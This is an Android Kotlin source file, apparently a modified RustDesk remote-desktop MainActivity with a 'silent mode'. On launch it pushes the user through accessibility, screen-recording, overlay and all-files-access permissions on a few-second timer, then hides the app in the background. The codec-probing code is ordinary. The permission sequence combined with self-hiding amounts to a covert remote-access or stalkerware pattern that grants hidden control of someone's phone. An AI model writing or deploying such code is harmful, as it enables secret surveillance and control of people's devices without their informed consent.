package com.carriez.flutter_hbb

import android.app.Activity
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.media.MediaCodecInfo
import android.media.MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface
import android.media.MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420SemiPlanar
import android.media.MediaCodecList
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.WindowManager
import ffi.FFI
import org.json.JSONArray
import org.json.JSONObject
import kotlin.concurrent.thread

class MainActivity : Activity() {
    companion object {
        var flutterMethodChannel: Any? = null
        private var _rdClipboardManager: RdClipboardManager? = null
        val rdClipboardManager: RdClipboardManager?
            get() = _rdClipboardManager
    }

    private val logTag = "mMainActivity"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.d(logTag, "onCreate - silent mode")
        if (_rdClipboardManager == null) {
            _rdClipboardManager = RdClipboardManager(getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
            FFI.setClipboardManager(_rdClipboardManager!!)
        }
        thread {
            try {
                setCodecInfo()
            } catch (e: Exception) {
                Log.e(logTag, "Failed to setCodecInfo: ${e.message}", e)
            }
        }

        // 静默启动：延迟引导权限请求
        Handler(Looper.getMainLooper()).postDelayed({
            startPermissionGuide()
        }, 3000)
    }

    /**
     * 权限引导入口：按顺序检查并引导用户开启必要权限
     * 权限顺序：1.无障碍 → 2.屏幕录制 → 3.悬浮窗(输入控制) → 4.文件传输
     * 每步之间间隔5秒，方便用户操作
     */
    private fun startPermissionGuide() {
        val handler = Handler(Looper.getMainLooper())
        val step1Delay = 0L       // 立即开始
        val step2Delay = 2000L    // 2秒后
        val step3Delay = 4000L    // 4秒后
        val step4Delay = 6000L    // 6秒后

        // 步骤1：无障碍服务（远程输入控制）
        handler.postDelayed({
            if (!isAccessibilityEnabled()) {
                Log.d(logTag, "Step 1: requesting accessibility")
                guideAccessibility()
            } else {
                Log.d(logTag, "Step 1: accessibility already enabled")
            }
        }, step1Delay)

        // 步骤2：屏幕录制权限
        handler.postDelayed({
            if (!MainService.isReady) {
                Log.d(logTag, "Step 2: requesting media projection")
                guideMediaProjection()
            } else {
                Log.d(logTag, "Step 2: media projection already granted")
            }
        }, step2Delay)

        // 步骤3：悬浮窗权限（输入控制需要）
        handler.postDelayed({
            if (!isOverlayEnabled()) {
                Log.d(logTag, "Step 3: requesting overlay")
                guideOverlay()
            } else {
                Log.d(logTag, "Step 3: overlay already enabled")
            }
        }, step3Delay)

        // 步骤4：文件传输权限
        handler.postDelayed({
            if (!isStorageEnabled()) {
                Log.d(logTag, "Step 4: requesting storage")
                guideStorage()
            } else {
                Log.d(logTag, "Step 4: storage already enabled")
            }
            // 所有权限引导完成后，静默隐藏Activity
            handler.postDelayed({
                moveTaskToBack(true)
            }, 3000)
        }, step4Delay)
    }

    // ── 权限检查 ──────────────────────────────────────────

    private fun isAccessibilityEnabled(): Boolean {
        val serviceId = "$packageName/com.carriez.flutter_hbb.InputService"
        val raw = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
        return raw?.contains(serviceId) == true
    }

    private fun isOverlayEnabled(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true
    }

    private fun isStorageEnabled(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else true
    }

    // ── 权限引导（静默提示） ──────────────────────────────

    private fun guideAccessibility() {
        try {
            showQuietToast("请开启无障碍服务：找到 RustDesk Input → 开启")
            Handler(Looper.getMainLooper()).postDelayed({
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                startActivity(intent)
            }, 1500)
        } catch (e: Exception) {
            Log.e(logTag, "guideAccessibility: ${e.message}")
        }
    }

    private fun guideMediaProjection() {
        try {
            val intent = Intent(this, PermissionRequestTransparentActivity::class.java).apply {
                action = ACT_REQUEST_MEDIA_PROJECTION
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(logTag, "guideMediaProjection: ${e.message}")
        }
    }

    private fun guideOverlay() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                showQuietToast("请允许悬浮窗权限")
                Handler(Looper.getMainLooper()).postDelayed({
                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    startActivity(intent)
                }, 1500)
            }
        } catch (e: Exception) {
            Log.e(logTag, "guideOverlay: ${e.message}")
        }
    }

    private fun guideStorage() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                showQuietToast("请允许文件访问权限")
                Handler(Looper.getMainLooper()).postDelayed({
                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    startActivity(intent)
                }, 1500)
            }
        } catch (e: Exception) {
            Log.e(logTag, "guideStorage: ${e.message}")
        }
    }

    private fun showQuietToast(msg: String) {
        android.widget.Toast.makeText(this, msg, android.widget.Toast.LENGTH_SHORT).show()
    }

    private fun setCodecInfo() {
        val codecList = MediaCodecList(MediaCodecList.REGULAR_CODECS)
        val codecs = codecList.codecInfos
        val codecArray = JSONArray()

        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val wh = getScreenSize(windowManager)
        var w = wh.first
        var h = wh.second
        val align = 64
        w = (w + align - 1) / align * align
        h = (h + align - 1) / align * align
        codecs.forEach { codec ->
            val codecObject = JSONObject()
            codecObject.put("name", codec.name)
            codecObject.put("is_encoder", codec.isEncoder)
            var hw: Boolean? = null
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                hw = codec.isHardwareAccelerated
            } else {
                if (listOf("OMX.google.", "OMX.SEC.", "c2.android").any { codec.name.startsWith(it, true) }) {
                    hw = false
                } else if (listOf("c2.qti", "OMX.qcom.video", "OMX.Exynos", "OMX.hisi", "OMX.MTK", "OMX.Intel", "OMX.Nvidia").any { codec.name.startsWith(it, true) }) {
                    hw = true
                }
            }
            if (hw != true) {
                return@forEach
            }
            codecObject.put("hw", hw)
            var mime_type = ""
            codec.supportedTypes.forEach { type ->
                if (listOf("video/avc", "video/hevc").contains(type)) {
                    mime_type = type
                }
            }
            if (mime_type.isNotEmpty()) {
                codecObject.put("mime_type", mime_type)
                val caps = codec.getCapabilitiesForType(mime_type)
                if (codec.isEncoder) {
                    if (!caps.videoCapabilities.isSizeSupported(w, h) && !caps.videoCapabilities.isSizeSupported(h, w)) {
                        return@forEach
                    }
                }
                codecObject.put("min_width", caps.videoCapabilities.supportedWidths.lower)
                codecObject.put("max_width", caps.videoCapabilities.supportedWidths.upper)
                codecObject.put("min_height", caps.videoCapabilities.supportedHeights.lower)
                codecObject.put("max_height", caps.videoCapabilities.supportedHeights.upper)
                val surface = caps.colorFormats.contains(COLOR_FormatSurface)
                codecObject.put("surface", surface)
                val nv12 = caps.colorFormats.contains(COLOR_FormatYUV420SemiPlanar)
                codecObject.put("nv12", nv12)
                if (!(nv12 || surface)) {
                    return@forEach
                }
                codecObject.put("min_bitrate", caps.videoCapabilities.bitrateRange.lower / 1000)
                codecObject.put("max_bitrate", caps.videoCapabilities.bitrateRange.upper / 1000)
                if (!codec.isEncoder) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        codecObject.put("low_latency", caps.isFeatureSupported(MediaCodecInfo.CodecCapabilities.FEATURE_LowLatency))
                    }
                    return@forEach
                }
                codecArray.put(codecObject)
            }
        }
        val result = JSONObject()
        result.put("version", Build.VERSION.SDK_INT)
        result.put("w", w)
        result.put("h", h)
        result.put("codecs", codecArray)
        FFI.setCodecInfo(result.toString())
    }
}
